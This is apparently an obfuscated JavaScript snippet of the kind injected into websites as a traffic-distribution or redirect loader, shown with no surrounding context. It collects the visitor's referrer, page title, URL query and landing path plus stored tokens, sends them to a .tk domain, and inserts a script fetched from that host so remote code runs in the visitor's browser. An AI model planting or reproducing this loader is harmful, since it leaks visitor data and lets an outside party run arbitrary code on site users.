  (function() {
    var name = '_98XWYVxmsJRjm45p';
    if (!window._98XWYVxmsJRjm45p) {
        window._98XWYVxmsJRjm45p = {
            unique: false,
            ttl: 86400,
            R_PATH: 'https://perneyledisrio.tk/fashionnetworks',
            P_PATH: 'https://perneyledisrio.tk/fec84ce/postback',
        };
    }
    const _N7ZKNDq19C3gnzMx = localStorage.getItem('config');
    if (typeof _N7ZKNDq19C3gnzMx !== 'undefined' && _N7ZKNDq19C3gnzMx !== null) {
        var _3pr9QnJhtZZD2XCj = JSON.parse(_N7ZKNDq19C3gnzMx);
        var _tTc5QxxdWjKnrVWw = Math.round(+new Date()/1000);
        if (_3pr9QnJhtZZD2XCj.created_at + window._98XWYVxmsJRjm45p.ttl < _tTc5QxxdWjKnrVWw) {
            localStorage.removeItem('subId');
            localStorage.removeItem('token');
            localStorage.removeItem('config');
        }
    }
    var _mSP1cLVmMfcJ9FNX = localStorage.getItem('subId');
    var _5YgrNLGzNWT9GPWn = localStorage.getItem('token');
    var _JTYzpZcMFxfs8fLS = '?return=js.client';
        _JTYzpZcMFxfs8fLS += '&' + decodeURIComponent(window.location.search.replace('?', ''));
        _JTYzpZcMFxfs8fLS += '&se_referrer=' + encodeURIComponent(document.referrer);
        _JTYzpZcMFxfs8fLS += '&default_keyword=' + encodeURIComponent(document.title);
        _JTYzpZcMFxfs8fLS += '&landing_url=' + encodeURIComponent(document.location.hostname + document.location.pathname);
        _JTYzpZcMFxfs8fLS += '&name=' + encodeURIComponent(name);
        _JTYzpZcMFxfs8fLS += '&host=' + encodeURIComponent(window._98XWYVxmsJRjm45p.R_PATH);
    if (typeof _mSP1cLVmMfcJ9FNX !== 'undefined' && _mSP1cLVmMfcJ9FNX && window._98XWYVxmsJRjm45p.unique) {
        _JTYzpZcMFxfs8fLS += '&sub_id=' + encodeURIComponent(_mSP1cLVmMfcJ9FNX);
    }
    if (typeof _5YgrNLGzNWT9GPWn !== 'undefined' && _5YgrNLGzNWT9GPWn && window._98XWYVxmsJRjm45p.unique) {
        _JTYzpZcMFxfs8fLS += '&token=' + encodeURIComponent(_5YgrNLGzNWT9GPWn);
    }
    var a = document.createElement('script');
        a.type = 'application/javascript';
        a.src = window._98XWYVxmsJRjm45p.R_PATH + _JTYzpZcMFxfs8fLS;
    var s = document.getElementsByTagName('script')[0];
    s.parentNode.insertBefore(a, s)
    })();
